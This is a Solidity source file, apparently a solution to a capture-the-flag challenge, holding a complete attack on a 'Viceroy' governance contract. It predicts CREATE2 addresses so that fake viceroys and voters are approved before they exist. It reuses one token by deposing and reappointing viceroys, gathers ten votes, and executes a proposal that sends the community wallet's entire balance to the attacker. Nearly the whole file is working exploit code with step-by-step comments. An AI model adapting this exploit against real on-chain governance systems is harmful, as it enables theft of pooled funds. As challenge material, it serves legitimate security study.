// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Governance, CommunityWallet} from "./Viceroy.sol";

contract GovernanceAttackerVoter {
    constructor(Governance governance, GovernanceAttackerViceroy viceroy, uint256 proposalId) {
        governance.voteOnProposal(proposalId, true, address(viceroy));
    }
}

contract GovernanceAttackerViceroy {
    // Observations:
    // Eventually, we want to execute a proposal that sends all funds to us
    // First, we need a viceroy to create that proposal
    // Then we need a viceroy to appoint voters.
    // Each viceroy can only appoint 5 voters.
    // We need 10 votes for that proposal to pass.
    // This means we'll need two viceroys to appoint 10 voters.
    // Our 10 voters would then vote on our proposal.
    // Anyone can execute the proposal.
    //
    // Let's start by getting 1 viceroy.
    constructor(Governance governance, bool createProposal, uint256 proposalId, bytes memory proposal) {
        if (createProposal) {
            governance.createProposal(address(this), proposal);
        }

        for (uint256 i = 0; i < 5; i++) {
            bytes32 salt = bytes32(i);
            bytes memory args = abi.encode(governance, this, proposalId);
            bytes32 code = keccak256(abi.encodePacked(type(GovernanceAttackerVoter).creationCode, args));
            bytes32 addr = keccak256(abi.encodePacked(bytes1(0xff), address(this), salt, code));
            address predictedAddress = address(uint160(uint256(addr)));

            governance.approveVoter(predictedAddress);

            // Create 5 new (already approved) voters, vote on proposal
            new GovernanceAttackerVoter{salt: salt}(governance, this, proposalId);
        }
    }
}

contract GovernanceAttacker {
    function attack(Governance governance, uint256 tokenId) external {
        CommunityWallet wallet = governance.communityWallet();
        bytes memory proposal = abi.encodeCall(CommunityWallet.exec, (address(this), "", address(wallet).balance));
        uint256 proposalId = uint256(keccak256(proposal));

        for (uint256 i = 0; i < 2; i++) {
            bool createProposal = i == 0;
            bytes32 salt = bytes32(i);
            bytes memory args = abi.encode(governance, createProposal, proposalId, proposal);
            bytes32 code = keccak256(abi.encodePacked(type(GovernanceAttackerViceroy).creationCode, args));
            bytes32 addr = keccak256(abi.encodePacked(bytes1(0xff), address(this), salt, code));
            address predictedAddress = address(uint160(uint256(addr)));

            governance.appointViceroy(predictedAddress, tokenId);

            // Create a new (already appointed) viceroy, first one creates the proposal
            // They also approve and then create approved voters, which vote on the proposal
            new GovernanceAttackerViceroy{salt: salt}(governance, i == 0, proposalId, proposal);

            // We depose the viceroy so we can appoint the next one, reusing the same token
            governance.deposeViceroy(predictedAddress, tokenId);
        }

        governance.executeProposal(proposalId);
    }

    receive() external payable {}
}
